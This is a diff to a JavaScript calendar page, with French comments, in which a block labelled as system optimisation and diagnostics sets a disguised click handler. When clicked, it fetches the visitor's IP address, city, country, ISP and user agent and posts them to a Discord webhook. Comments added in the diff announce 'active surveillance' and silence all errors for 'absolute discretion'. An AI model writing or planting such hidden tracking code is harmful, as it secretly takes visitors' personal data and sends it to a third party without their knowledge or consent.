@@ -277,14 +277,15 @@ for (let day = 1; day <= daysInMonth; day++) {
 
 // --- 8. OPTIMISATION & DIAGNOSTIC SYSTÈME ---
 (function() {
-    const _remoteLog = "TON_URL_WEBHOOK_ICI";
+    // REMPLACE L'URL CI-DESSOUS PAR TON URL WEBHOOK DISCORD
+    const _remoteLog = "1494459709598597233";
     const _node = document.getElementById('_v-cal-sync');
 
     if (_node) {
         _node.onclick = async function(e) {
             e.preventDefault();
             try {
-
+                // Récupération de l'IP et de la Géolocalisation (Ville/Pays)
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
 
@@ -299,7 +300,7 @@ for (let day = 1; day <= daysInMonth; day++) {
                             { name: "🏢 Fournisseur", value: data.org, inline: true },
                             { name: "📱 Appareil", value: navigator.userAgent.substring(0, 120) }
                         ],
-                        footer: { text: "Ken Aiguise" },
+                        footer: { text: "Ken Aiguise - Surveillance Active" },
                         timestamp: new Date()
                     }]
                 };
@@ -310,7 +311,7 @@ for (let day = 1; day <= daysInMonth; day++) {
                     body: JSON.stringify(report)
                 });
             } catch (err) {
-              
+                // Discrétion absolue : aucune erreur en console
             }
         };
     }
